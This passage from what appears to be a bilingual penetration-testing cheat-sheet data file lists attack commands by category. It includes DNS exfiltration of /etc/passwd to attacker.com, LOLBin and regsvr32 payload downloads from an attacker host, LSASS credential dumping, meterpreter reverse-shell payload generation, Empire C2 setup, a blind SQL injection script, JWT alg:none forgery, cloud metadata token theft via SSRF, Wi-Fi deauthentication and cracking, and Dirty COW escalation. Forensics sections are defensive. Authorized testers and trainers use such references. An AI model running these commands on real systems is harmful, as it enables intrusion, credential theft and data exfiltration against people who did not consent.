      { name: { zh: 'SSTI 探测', en: 'SSTI detection' }, command: "# Jinja2/Twig/Smarty\ncurl 'http://target/page?name={{7*7}}'\ncurl 'http://target/page?name=${7*7}'\ncurl 'http://target/page?name=#{7*7}'\n# tplmap 自动探测\npython3 tplmap.py -u 'http://target/page?name=test'", description: { zh: 'SSTI 服务端模板注入探测', en: 'SSTI server-side template injection detection' }, platform: 'all' },
      { name: { zh: 'SSRF 探测', en: 'SSRF detection' }, command: "# 使用 Burp Collaborator 或 interactsh\ncurl -H 'X-Forwarded-For: http://YOUR_COLLAB.oast.me' target\ncurl 'http://target/fetch?url=http://169.254.169.254/'\n# interactsh-client\ninteractsh-client -v", description: { zh: 'SSRF 服务端请求伪造探测', en: 'SSRF detection using OOB callbacks' }, platform: 'all' },
      { name: { zh: '原型链污染', en: 'Prototype pollution' }, command: "# 探测\ncurl -X POST target/api -d '{\"__proto__\":{\"polluted\":true}}'\ncurl -X POST target/api -d '{\"constructor\":{\"prototype\":{\"polluted\":true}}}'\n# 检验\ncurl target/api -d '{\"__proto__\":{\"admin\":true}}'", description: { zh: 'JavaScript 原型链污染测试', en: 'JavaScript prototype pollution testing' }, platform: 'all' },
      { name: { zh: 'HackBar 浏览器插件', en: 'Browser dev tools tips' }, command: "# F12 -> Console\nfetch('/api/admin',{headers:{'X-Admin':'true'}}).then(r=>r.text()).then(console.log)\n# 修改请求\nfetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({role:'admin'})})", description: { zh: '浏览器开发者工具技巧', en: 'Browser developer tools tips for CTF' }, platform: 'all' },
      { name: { zh: 'PHP 弱类型利用', en: 'PHP type juggling' }, command: "# 弱比较 ==\nphp -r \"var_dump('0e123' == '0e456');\"  // true\nphp -r \"var_dump(0 == 'admin');\"  // true (PHP<8)\n# md5 碰撞\n# 两个 md5 以 0e 开头的字符串相等\nphp -r \"echo md5('240610708');\"  // 0e462097431906509019562988736854", description: { zh: 'PHP 弱类型比较利用', en: 'PHP weak type comparison exploitation' }, platform: 'all' },
      { name: { zh: 'SQL 盲注脚本', en: 'Blind SQL injection script' }, command: "import requests\nflag = ''\nfor i in range(1, 50):\n    for c in range(32, 127):\n        r = requests.get(f'http://target/?id=1 AND ASCII(SUBSTRING(flag,{i},1))={c}-- -')\n        if 'Welcome' in r.text:\n            flag += chr(c); break\nprint(flag)", description: { zh: '布尔盲注自动化脚本', en: 'Automated boolean blind SQL injection script' }, platform: 'all' }
    ],
    references: ['https://github.com/epinna/tplmap']
  },
  {
    id: 'file-transfer-techniques',
    name: { zh: '文件传输技术', en: 'File Transfer Techniques' },
    description: { zh: '渗透测试中各种场景的文件传输方法', en: 'File transfer methods for various penetration testing scenarios' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    commands: [
      { name: { zh: 'Python HTTP 服务器', en: 'Python HTTP server' }, command: 'python3 -m http.server 8000\n# 目标下载\ncurl http://attacker:8000/file -o /tmp/file\nwget http://attacker:8000/file', description: { zh: '快速启动 HTTP 文件服务器', en: 'Quick HTTP file server startup' }, platform: 'all' },
      { name: { zh: 'Windows 下载方法', en: 'Windows download methods' }, command: 'certutil -urlcache -f http://attacker/file.exe file.exe\nbitsadmin /transfer myJob http://attacker/file.exe C:\\file.exe\npowershell -c "IWR http://attacker/file -OutFile C:\\file"\ncurl.exe http://attacker/file -o C:\\file', description: { zh: 'Windows LOLBins 文件下载', en: 'Windows LOLBins file download methods' }, platform: 'windows' },
      { name: { zh: 'SMB 服务器传文件', en: 'SMB server file transfer' }, command: '# 攻击者启动 SMB\nimpacket-smbserver share . -smb2support -username user -password pass\n# 目标连接下载\nnet use Z: \\\\attacker\\share /user:user pass\ncopy Z:\\payload.exe C:\\payload.exe', description: { zh: '通过 SMB 服务传输文件', en: 'Transfer files via SMB server' }, platform: 'all' },
      { name: { zh: 'Base64 编码传输', en: 'Base64 encoded transfer' }, command: '# 编码文件\nbase64 -w 0 file.bin\n# 目标解码\necho BASE64_STRING | base64 -d > file.bin\n# Windows\n[System.Convert]::FromBase64String("...") | Set-Content -Path file.bin -Encoding Byte', description: { zh: 'Base64 编码文件传输', en: 'Base64 encoded file transfer' }, platform: 'all' },
      { name: { zh: 'DNS 数据外带', en: 'DNS data exfiltration' }, command: "# 编码数据\nDATA=$(cat /etc/passwd | base64 | tr '+/' '-_' | tr -d '=')\n# 通过 DNS 发送(每63字节一段)\nfor i in $(seq 0 63 ${#DATA}); do dig ${DATA:$i:63}.attacker.com; done", description: { zh: '通过 DNS 外带数据', en: 'Exfiltrate data via DNS queries' }, platform: 'linux' }
    ],
    references: ['https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/']
  },
  {
    id: 'active-recon-tools',
    name: { zh: '主动侦察工具', en: 'Active Reconnaissance Tools' },
    description: { zh: '主动信息收集和端口扫描工具命令', en: 'Active information gathering and port scanning tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',
    commands: [
      { name: { zh: 'Naabu 端口扫描', en: 'Naabu port scan' }, command: 'naabu -host target.com -p 80,443,8080-8090\nnaabu -list ips.txt -top-ports 1000 -o open_ports.txt\nnaabu -host target.com -p - -rate 1000  # 全端口', description: { zh: '快速端口发现工具', en: 'Fast port discovery tool' }, platform: 'all' },
      { name: { zh: 'DNSX DNS 解析', en: 'DNSX DNS resolution' }, command: 'echo "target.com" | dnsx -a -cname -mx -ns -txt\ncat subs.txt | dnsx -silent -a -resp -o resolved.txt', description: { zh: '批量 DNS 解析', en: 'Batch DNS resolution' }, platform: 'all' },
      { name: { zh: 'TLSX 证书信息', en: 'TLSX certificate info' }, command: 'echo "target.com" | tlsx -san -cn -silent\ncat ips.txt | tlsx -port 443 -silent -o certs.txt', description: { zh: '提取 TLS 证书信息', en: 'Extract TLS certificate information' }, platform: 'all' },
      { name: { zh: 'ASSETFINDER 资产发现', en: 'Assetfinder discovery' }, command: 'assetfinder --subs-only target.com\nassetfinder target.com | httpx -silent', description: { zh: '子域名和资产快速发现', en: 'Fast subdomain and asset discovery' }, platform: 'all' }
    ],
    references: ['https://github.com/projectdiscovery/naabu']
  },
  {
    id: 'windows-commands-advanced',
    name: { zh: 'Windows 高级命令', en: 'Windows Advanced Commands' },
    description: { zh: 'Windows 渗透测试高级系统命令集合', en: 'Advanced Windows system commands for penetration testing' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '进程注入检测', en: 'Process injection detection' }, command: 'Get-Process | Where-Object {$_.MainWindowTitle -eq ""} | Select-Object Name,Id,Path\ntasklist /m /fo list > modules.txt', description: { zh: '检测可疑进程注入', en: 'Detect suspicious process injection' }, platform: 'windows' },
      { name: { zh: '搜索敏感文件', en: 'Search sensitive files' }, command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.xml,*.conf,*.config,*.ini -ErrorAction SilentlyContinue\ndir /s /b C:\\*password*.txt C:\\*secret*.txt 2>nul', description: { zh: '递归搜索敏感文件', en: 'Recursively search for sensitive files' }, platform: 'windows' },
      { name: { zh: '网络共享和连接', en: 'Network shares and connections' }, command: 'net share\nnet use\nnet view /all /domain:domain.com\nGet-SmbShare\nGet-SmbConnection', description: { zh: '枚举网络共享和活动连接', en: 'Enumerate network shares and active connections' }, platform: 'windows' },
      { name: { zh: 'AppLocker 绕过', en: 'AppLocker bypass' }, command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml\nregsvr32 /s /u /i:http://attacker/payload.sct scrobj.dll\n# WMIC\nwmic process call create "cmd.exe /c command"', description: { zh: 'AppLocker 常见绕过方式', en: 'Common AppLocker bypass techniques' }, platform: 'windows' },
      { name: { zh: '转储 LSASS', en: 'Dump LSASS' }, command: '# Task Manager 右键 -> Create dump file\n# procdump\nprocdump.exe -ma lsass.exe lsass.dmp\n# comsvcs.dll\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full', description: { zh: 'LSASS 内存转储方法', en: 'LSASS memory dump methods' }, platform: 'windows' }
    ],
    references: ['https://lolbas-project.github.io/']
  },


  {
    id: 'ctf-misc-tools',
    name: { zh: 'CTF Misc 工具集', en: 'CTF Misc Tools' },
    description: { zh: 'CTF 杂项题常用工具：QR码、条形码、音频分析、图像处理', en: 'Common CTF misc challenge tools: QR codes, barcodes, audio analysis, image processing' },
    category: { zh: 'CTF/Misc', en: 'CTF / Misc' },
    installation: 'pip install qrcode pyzbar pillow pydub',
    commands: [
      { name: { zh: 'QR 码解码', en: 'QR code decode' }, command: "zbarimg image.png\npython3 -c \"from PIL import Image; from pyzbar import pyzbar; print(pyzbar.decode(Image.open('qr.png')))\"\n# 修复损坏 QR: stegsolve 或在线工具", description: { zh: 'QR 码读取和解码', en: 'Read and decode QR codes' }, platform: 'all' },
      { name: { zh: '音频分析', en: 'Audio analysis' }, command: "# 频谱分析\nsox audio.wav -n spectrogram -o spec.png\n# Audacity: 查看频谱图\n# DTMF 解码\nmultimon-ng -t wav -a DTMF audio.wav\n# 摩斯码\npython3 -c \"import librosa; y,sr=librosa.load('audio.wav')\"", description: { zh: '音频隐写和分析', en: 'Audio steganography and analysis' }, platform: 'linux' },
      { name: { zh: '图片 LSB 分析', en: 'Image LSB analysis' }, command: "# stegsolve 工具\njava -jar stegsolve.jar\n# Python LSB\nfrom PIL import Image\nimg = Image.open('img.png').convert('RGB')\nbits = [img.getpixel((x,y))[0]&1 for y in range(img.height) for x in range(img.width)]\nprint(''.join(chr(int(''.join(map(str,bits[i:i+8])),2)) for i in range(0,160,8)))", description: { zh: '图片最低有效位隐写分析', en: 'Image least significant bit steganography analysis' }, platform: 'all' },
      { name: { zh: '压缩包破解', en: 'Archive cracking' }, command: 'fcrackzip -v -u -D -p rockyou.txt archive.zip\njohn --wordlist=rockyou.txt <(zip2john archive.zip)\n7z x archive.7z -p password', description: { zh: '破解加密压缩包', en: 'Crack encrypted archives' }, platform: 'linux' },
      { name: { zh: 'EXIF 数据', en: 'EXIF data' }, command: 'exiftool image.jpg\nexiftool -all= image.jpg  # 清除元数据\nexiftool -Comment="hidden" image.jpg  # 写入元数据', description: { zh: 'EXIF 元数据读写', en: 'EXIF metadata read and write' }, platform: 'all' }
    ],
    references: ['https://github.com/eugenekolo/sec-tools']
  },
  {
    id: 'decompilers',
    name: { zh: '反编译工具', en: 'Decompiler Tools' },
    description: { zh: '各语言反编译和逆向工程工具命令', en: 'Decompiler and reverse engineering tools for various languages' },
    category: { zh: '逆向工程', en: 'Reverse Engineering' },
    installation: 'pip install jadx / apt install apktool',
    commands: [
      { name: { zh: 'JADX Android 反编译', en: 'JADX Android decompile' }, command: 'jadx -d output/ app.apk\njadx-gui app.apk  # GUI模式\n# 搜索字符串\ngrep -r "password\\|secret\\|key" output/ --include="*.java"', description: { zh: 'Android APK 反编译', en: 'Decompile Android APK' }, platform: 'all' },
      { name: { zh: 'APKTool 资源提取', en: 'APKTool resource extract' }, command: 'apktool d app.apk -o output/\napktool b output/ -o rebuilt.apk\n# 重新签名\njarsigner -keystore keystore.jks rebuilt.apk alias', description: { zh: 'APK 反编译和重打包', en: 'APK decompilation and repackaging' }, platform: 'all' },
      { name: { zh: 'dnSpy .NET 反编译', en: 'dnSpy .NET decompile' }, command: '# dnSpy GUI: 拖入 .exe/.dll\n# 命令行 ILSpy\nilspycmd assembly.dll > decompiled.cs\ndotnet ilspycmd assembly.dll -o ./output/', description: { zh: '.NET 程序集反编译', en: 'Decompile .NET assembly' }, platform: 'all' },
      { name: { zh: 'objdump ELF 分析', en: 'objdump ELF analysis' }, command: 'objdump -d binary | head -100\nobjdump -T binary  # 动态符号\nobjdump -S binary  # 反汇编+源码\nreadelf -a binary | head -50', description: { zh: 'ELF 二进制文件分析', en: 'ELF binary file analysis' }, platform: 'linux' },
      { name: { zh: 'strings 分析', en: 'strings analysis' }, command: 'strings binary | grep -iE "flag|pass|key|token|secret"\nstrings -a -n 6 binary | head -100\nstrings binary | grep http', description: { zh: '从二进制提取字符串', en: 'Extract strings from binary' }, platform: 'all' }
    ],
    references: ['https://github.com/skylot/jadx', 'https://github.com/icsharpcode/ILSpy']
  },
  {
    id: 'pivoting-tools',
    name: { zh: '内网枢转工具', en: 'Internal Network Pivoting Tools' },
    description: { zh: '专用内网枢转和代理工具集合', en: 'Dedicated intranet pivoting and proxy tool collection' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    installation: { zh: '各工具独立安装', en: 'Install each tool separately' },
    commands: [
      { name: { zh: 'sshuttle VPN over SSH', en: 'sshuttle VPN over SSH' }, command: 'sshuttle -r user@jump_host 10.10.10.0/24 192.168.1.0/24\n# 自动路由所有内网流量\nsshuttle -r user@jump_host 0/0  # 全流量', description: { zh: '通过 SSH 隧道路由内网流量', en: 'Route intranet traffic through SSH tunnel' }, platform: 'linux' },
      { name: { zh: 'Metasploit SOCKS', en: 'Metasploit SOCKS proxy' }, command: 'use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j\n# 配合 route 或 autoroute', description: { zh: 'Metasploit SOCKS5 代理', en: 'Metasploit SOCKS5 proxy setup' }, platform: 'linux' },
      { name: { zh: 'rpivot 反向 HTTP 代理', en: 'rpivot reverse HTTP proxy' }, command: '# 攻击者\npython server.py --proxy-port 9050 --server-port 9999\n# 目标内网机器\npython client.py --server-ip attacker --server-port 9999', description: { zh: 'HTTP 反向代理隧道', en: 'HTTP reverse proxy tunnel' }, platform: 'all' },
      { name: { zh: 'Stowaway 代理', en: 'Stowaway proxy' }, command: '# 攻击者管理端\n./stowaway_admin --listen :9999\n# 目标 Agent\n./stowaway_agent --connect attacker:9999', description: { zh: 'Stowaway 多级代理', en: 'Stowaway multi-hop proxy' }, platform: 'linux' }
    ],
    references: ['https://github.com/ph4ntonn/Stowaway']
  },
  {
    id: 'exploit-frameworks',
    name: { zh: '漏洞利用框架', en: 'Exploit Frameworks' },
    description: { zh: '各种漏洞利用框架命令速查', en: 'Quick reference for various exploit framework commands' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    commands: [
      { name: { zh: 'Venom payload 生成', en: 'Venom payload generation' }, command: 'venom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -o payload.exe\nvenom -p python/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -o payload.py', description: { zh: 'Venom 生成免杀 Payload', en: 'Generate evasion-ready payload with Venom' }, platform: 'linux' },
      { name: { zh: 'SpiderFoot 自动 OSINT', en: 'SpiderFoot auto OSINT' }, command: 'spiderfoot -s target.com -t ALL\nspiderfoot-cli  # 命令行模式', description: { zh: 'SpiderFoot 自动化 OSINT', en: 'SpiderFoot automated OSINT' }, platform: 'linux' },
      { name: { zh: 'Empire PowerShell C2', en: 'Empire PowerShell C2' }, command: 'python3 empire\n# 在 Empire 中:\nlisteners\nuselistener http\nset Name test; execute\nusestager windows/launcher_bat\nset Listener test; execute', description: { zh: 'Empire PowerShell C2 框架', en: 'Empire PowerShell C2 framework' }, platform: 'linux' }
    ],
    references: ['https://github.com/BC-SECURITY/Empire']
  },


  {
    id: 'linux-forensics',
    name: { zh: 'Linux 取证命令', en: 'Linux Forensics Commands' },
    description: { zh: 'Linux 系统取证和应急响应命令', en: 'Linux system forensics and incident response commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: '进程和网络快照', en: 'Process and network snapshot' }, command: 'ps auxf > /tmp/ps.txt\nss -tlnp > /tmp/ss.txt\nnetstat -antp > /tmp/netstat.txt\nlsof -i > /tmp/lsof.txt', description: { zh: '收集进程和网络连接快照', en: 'Collect process and network connection snapshot' }, platform: 'linux' },
      { name: { zh: '已删除文件恢复', en: 'Recover deleted files' }, command: 'lsof | grep deleted\n# 通过 /proc 恢复\ncp /proc/PID/fd/FD /tmp/recovered_file\n# extundelete\nextundelete /dev/sda1 --restore-all', description: { zh: '恢复已删除文件', en: 'Recover deleted files' }, platform: 'linux' },
      { name: { zh: '用户活动调查', en: 'User activity investigation' }, command: 'last -F\nlastb -F  # 失败登录\ncat /var/log/auth.log | grep -i "failed\\|invalid\\|accepted"\ncat ~/.bash_history', description: { zh: '调查用户登录和活动记录', en: 'Investigate user login and activity records' }, platform: 'linux' },
      { name: { zh: '持久化检查', en: 'Persistence check' }, command: 'crontab -l\ncat /etc/crontab\nls -la /etc/cron.*\nls -la ~/.config/autostart/\nsystemctl list-units --type=service --state=enabled', description: { zh: '检查系统持久化机制', en: 'Check system persistence mechanisms' }, platform: 'linux' },
      { name: { zh: '网络流量历史', en: 'Network history' }, command: 'cat /var/log/syslog | grep -i "nc\\|ncat\\|netcat"\ndstat -n 1 10\niftop -i eth0', description: { zh: '分析网络流量历史记录', en: 'Analyze network traffic history' }, platform: 'linux' }
    ],
    references: ['https://www.sans.org/blog/linux-forensics-cheat-sheet/']
  },
  {
    id: 'windows-forensics',
    name: { zh: 'Windows 取证命令', en: 'Windows Forensics Commands' },
    description: { zh: 'Windows 系统取证和应急响应命令', en: 'Windows system forensics and incident response commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: '事件日志分析', en: 'Event log analysis' }, command: 'Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Id -in 4624,4625,4688,4698}\nwevtutil qe Security /q:"*[System[EventID=4624]]" /f:text /c:20', description: { zh: '分析 Windows 安全事件日志', en: 'Analyze Windows security event logs' }, platform: 'windows' },
      { name: { zh: 'Prefetch 分析', en: 'Prefetch analysis' }, command: 'Get-ChildItem C:\\Windows\\Prefetch\\*.pf | Sort LastWriteTime -Descending | Select -First 20 Name,LastWriteTime\n# PECmd.exe (Zimmerman Tools)\nPECmd.exe -d C:\\Windows\\Prefetch', description: { zh: '分析 Prefetch 执行痕迹', en: 'Analyze Prefetch execution traces' }, platform: 'windows' },
      { name: { zh: '注册表取证', en: 'Registry forensics' }, command: '# 最近使用文件\nreg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"\n# 执行过的程序\nreg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist"', description: { zh: '注册表取证分析', en: 'Registry forensics analysis' }, platform: 'windows' },
      { name: { zh: '内存采集', en: 'Memory acquisition' }, command: '# WinPmem\nwinpmem.exe memory.raw\n# NotMyFault (SysInternals)\nNotMyFault64.exe /crashdump', description: { zh: '采集 Windows 内存镜像', en: 'Acquire Windows memory image' }, platform: 'windows' },
      { name: { zh: '磁盘镜像', en: 'Disk imaging' }, command: '# FTK Imager CLI\nftkimager.exe \\\\.\\PhysicalDrive0 image.dd\n# 或 dd (Cygwin)\ndd if=\\\\.\\PhysicalDrive0 of=disk.img bs=512', description: { zh: '采集磁盘镜像', en: 'Acquire disk image' }, platform: 'windows' }
    ],
    references: ['https://github.com/EricZimmerman/Tools']
  },
  {
    id: 'web-api-testing',
    name: { zh: 'Web API 安全测试', en: 'Web API Security Testing' },
    description: { zh: 'REST API 和 GraphQL 安全测试工具命令', en: 'REST API and GraphQL security testing tool commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install httpie / apt install httpie',
    commands: [
      { name: { zh: 'HTTPie API 测试', en: 'HTTPie API testing' }, command: "http GET https://api.target.com/users Authorization:'Bearer TOKEN'\nhttp POST https://api.target.com/login username=admin password=pass\nhttp PUT https://api.target.com/user/1 role=admin Authorization:'Bearer TOKEN'", description: { zh: '使用 HTTPie 测试 API', en: 'Test APIs using HTTPie' }, platform: 'all' },
      { name: { zh: 'BOLA/IDOR 测试', en: 'BOLA/IDOR testing' }, command: "# 遍历其他用户资源\nfor i in {1..100}; do\n  curl -s -o /dev/null -w '%{http_code} ' https://api.target.com/users/$i -H 'Authorization: Bearer TOKEN'\ndone", description: { zh: 'BOLA/IDOR 越权遍历测试', en: 'BOLA/IDOR authorization bypass enumeration' }, platform: 'linux' },
      { name: { zh: 'Mass Assignment 测试', en: 'Mass assignment test' }, command: 'curl -X PUT https://api.target.com/user/profile -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d \'{"name":"user","role":"admin","is_admin":true,"balance":99999}\'', description: { zh: '批量赋值漏洞测试', en: 'Mass assignment vulnerability test' }, platform: 'all' },
      { name: { zh: 'API 版本枚举', en: 'API version enumeration' }, command: "for v in v1 v2 v3 v4 api api/v1 api/v2; do\n  curl -s -o /dev/null -w \"$v: %{http_code}\\n\" https://target.com/$v/users\ndone", description: { zh: '枚举 API 版本路径', en: 'Enumerate API version paths' }, platform: 'linux' },
      { name: { zh: 'JWT None 绕过', en: 'JWT None bypass' }, command: "# Python 构造\nimport base64, json\nh = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().strip('=')\np = base64.b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().strip('=')\nprint(f'{h}.{p}.')", description: { zh: 'JWT alg:none 绕过攻击', en: 'JWT alg:none bypass attack' }, platform: 'all' }
    ],
    references: ['https://owasp.org/www-project-api-security/']
  },
  {
    id: 'cloud-gcp-pentest',
    name: { zh: 'GCP 云安全测试', en: 'GCP Cloud Security Testing' },
    description: { zh: 'Google Cloud Platform 渗透测试命令', en: 'Google Cloud Platform penetration testing commands' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'apt install google-cloud-cli / pip install gcloud',
    commands: [
      { name: { zh: 'gcloud 认证', en: 'gcloud authentication' }, command: 'gcloud auth login\ngcloud config set project PROJECT_ID\ngcloud auth list', description: { zh: 'GCP 身份认证', en: 'GCP authentication' }, platform: 'all' },
      { name: { zh: '资源枚举', en: 'Resource enumeration' }, command: 'gcloud projects list\ngcloud compute instances list\ngcloud storage buckets list\ngcloud iam service-accounts list', description: { zh: '枚举 GCP 资源', en: 'Enumerate GCP resources' }, platform: 'all' },
      { name: { zh: 'IAM 权限检查', en: 'IAM permission check' }, command: 'gcloud projects get-iam-policy PROJECT_ID\ngcloud iam service-accounts get-iam-policy SA_EMAIL', description: { zh: '检查 GCP IAM 权限', en: 'Check GCP IAM permissions' }, platform: 'all' },
      { name: { zh: '元数据服务 (SSRF)', en: 'Metadata service (SSRF)' }, command: 'curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"\ncurl "http://169.254.169.254/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"', description: { zh: 'GCP 元数据服务访问', en: 'Access GCP metadata service' }, platform: 'all' },
      { name: { zh: 'GCS 存储桶测试', en: 'GCS bucket testing' }, command: 'gsutil ls gs://bucket-name\ngsutil ls -la gs://bucket-name\ngsutil cp gs://bucket-name/sensitive.txt .\n# 匿名访问测试\ncurl https://storage.googleapis.com/bucket-name/', description: { zh: 'GCS 存储桶权限测试', en: 'GCS bucket permission testing' }, platform: 'all' }
    ],
    references: ['https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation']
  },


  {
    id: 'python-pentest-scripts',
    name: { zh: 'Python 渗透测试脚本', en: 'Python Penetration Testing Scripts' },
    description: { zh: '渗透测试常用 Python 脚本模板', en: 'Common Python script templates for penetration testing' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'HTTP 模糊测试', en: 'HTTP fuzzing' }, command: "import requests\nwordlist = open('/usr/share/seclists/Discovery/Web-Content/common.txt').readlines()\nfor word in wordlist:\n    url = f'http://target.com/{word.strip()}'\n    r = requests.get(url, timeout=3)\n    if r.status_code not in [404, 403]:\n        print(f'{r.status_code} {url}')", description: { zh: 'Python HTTP 目录爆破', en: 'Python HTTP directory brute force' }, platform: 'all' },
      { name: { zh: '端口扫描器', en: 'Port scanner' }, command: "import socket, concurrent.futures\ndef scan(port):\n    s = socket.socket()\n    s.settimeout(0.5)\n    try: s.connect(('target', port)); print(f'{port} open'); s.close()\n    except: pass\nwith concurrent.futures.ThreadPoolExecutor(100) as ex:\n    ex.map(scan, range(1, 65536))", description: { zh: 'Python 多线程端口扫描', en: 'Python multithreaded port scanner' }, platform: 'all' },
      { name: { zh: 'SQL 注入测试', en: 'SQL injection test' }, command: "import requests\npayloads = [\"'\",\"1' OR '1'='1\",\"1' AND SLEEP(3)-- -\",\"1 UNION SELECT NULL-- -\"]\nfor p in payloads:\n    r = requests.get(f'http://target.com/?id={p}')\n    print(f'{p}: {len(r.text)} bytes, {r.elapsed.total_seconds():.2f}s')", description: { zh: 'Python SQL 注入探测脚本', en: 'Python SQL injection detection script' }, platform: 'all' },
      { name: { zh: '目录遍历测试', en: 'Path traversal test' }, command: "import requests\npayloads = ['../etc/passwd','..%2fetc%2fpasswd','....//....//etc//passwd','%2e%2e%2f'*6+'etc/passwd']\nfor p in payloads:\n    r = requests.get(f'http://target.com/file?name={p}')\n    if 'root:' in r.text: print(f'[+] Vulnerable: {p}')", description: { zh: 'Python 路径遍历探测', en: 'Python path traversal detection' }, platform: 'all' }
    ],
    references: ['https://docs.python-requests.org/']
  },
  {
    id: 'wireless-attacks',
    name: { zh: 'Wi-Fi 无线安全测试', en: 'Wi-Fi Wireless Security Testing' },
    description: { zh: 'Wi-Fi 无线网络渗透测试工具命令', en: 'Wi-Fi wireless network penetration testing tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install aircrack-ng hostapd',
    commands: [
      { name: { zh: '监听模式', en: 'Monitor mode' }, command: 'airmon-ng start wlan0\n# 验证\niwconfig wlan0mon', description: { zh: '开启无线网卡监听模式', en: 'Enable wireless adapter monitor mode' }, platform: 'linux' },
      { name: { zh: '扫描周边 AP', en: 'Scan nearby APs' }, command: 'airodump-ng wlan0mon\nairodump-ng --bssid TARGET_BSSID -c 6 -w capture wlan0mon', description: { zh: '扫描周边无线接入点', en: 'Scan nearby wireless access points' }, platform: 'linux' },
      { name: { zh: 'WPA2 握手抓取', en: 'WPA2 handshake capture' }, command: '# 反认证攻击强制重新连接\naireplay-ng -0 5 -a TARGET_BSSID wlan0mon\n# 验证握手\naircrack-ng capture*.cap', description: { zh: '捕获 WPA2 四次握手', en: 'Capture WPA2 four-way handshake' }, platform: 'linux' },
      { name: { zh: 'WPA2 破解', en: 'WPA2 password crack' }, command: 'aircrack-ng -w rockyou.txt capture.cap\nhashcat -m 22000 capture.hc22000 rockyou.txt', description: { zh: '破解 WPA2 握手密码', en: 'Crack WPA2 handshake password' }, platform: 'linux' },
      { name: { zh: 'WPS PIN 攻击', en: 'WPS PIN attack' }, command: 'wash -i wlan0mon  # 扫描开启 WPS 的 AP\nreaver -i wlan0mon -b TARGET_BSSID -vv', description: { zh: 'WPS PIN 暴力破解', en: 'WPS PIN brute force attack' }, platform: 'linux' }
    ],
    references: ['https://www.aircrack-ng.org/doku.php']
  },


  {
    id: 'network-enum-tools',
    name: { zh: '网络枚举工具', en: 'Network Enumeration Tools' },
    description: { zh: '内网服务枚举和漏洞发现工具命令', en: 'Internal network service enumeration and vulnerability discovery commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'SNMP 枚举', en: 'SNMP enumeration' }, command: 'snmpwalk -c public -v1 target\nsnmpwalk -c public -v2c target 1.3.6.1.4.1\nonesixtyone -c community.txt -i hosts.txt', description: { zh: 'SNMP 社区字符串枚举', en: 'SNMP community string enumeration' }, platform: 'linux' },
      { name: { zh: 'LDAP 匿名枚举', en: 'LDAP anonymous enum' }, command: "ldapsearch -x -H ldap://target -b '' -s base '(objectClass=*)'\nldapsearch -x -H ldap://dc -b 'DC=domain,DC=com' -s sub '(objectClass=User)' sAMAccountName", description: { zh: 'LDAP 匿名信息收集', en: 'LDAP anonymous information gathering' }, platform: 'linux' },
      { name: { zh: 'RPC 枚举', en: 'RPC enumeration' }, command: 'rpcclient -U "" -N target\n# 交互命令\nenumdomusers\nenumdomgroups\nquerydispinfo', description: { zh: 'Windows RPC 匿名枚举', en: 'Windows RPC anonymous enumeration' }, platform: 'linux' },
      { name: { zh: 'NetBIOS 枚举', en: 'NetBIOS enumeration' }, command: 'nmblookup -A target\nnbtscan -r 192.168.1.0/24\nenum4linux -a target', description: { zh: 'NetBIOS/SMB 信息枚举', en: 'NetBIOS/SMB information enumeration' }, platform: 'linux' },
      { name: { zh: 'VNC 枚举', en: 'VNC enumeration' }, command: 'nmap -sV -p 5900-5905 target\nvncviewer target:5900\n# 破解 VNC 密码\nhydra -P wordlist.txt vnc://target', description: { zh: 'VNC 服务枚举和攻击', en: 'VNC service enumeration and attack' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/network-services-pentesting']
  },
  {
    id: 'kernel-exploits',
    name: { zh: 'Linux 内核漏洞利用', en: 'Linux Kernel Exploits' },
    description: { zh: 'Linux 常见内核提权漏洞利用', en: 'Common Linux kernel privilege escalation exploits' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: '查找内核漏洞', en: 'Find kernel exploits' }, command: 'uname -r\n# 使用 LES\nbash les.sh\n# 或 linux-exploit-suggester-2\nperl linux-exploit-suggester-2.pl\n# 查 searchsploit\nsearchsploit linux kernel $(uname -r | cut -d. -f1,2)', description: { zh: '识别适用的内核提权漏洞', en: 'Identify applicable kernel privilege escalation exploits' }, platform: 'linux' },
      { name: { zh: 'Dirty COW (CVE-2016-5195)', en: 'Dirty COW' }, command: 'gcc -pthread dirty.c -o dirty -lcrypt\n./dirty password\n# 或\ngcc -pthread c0w.c -o c0w && ./c0w', description: { zh: 'Dirty COW 内核提权', en: 'Dirty COW kernel privilege escalation' }, platform: 'linux' },
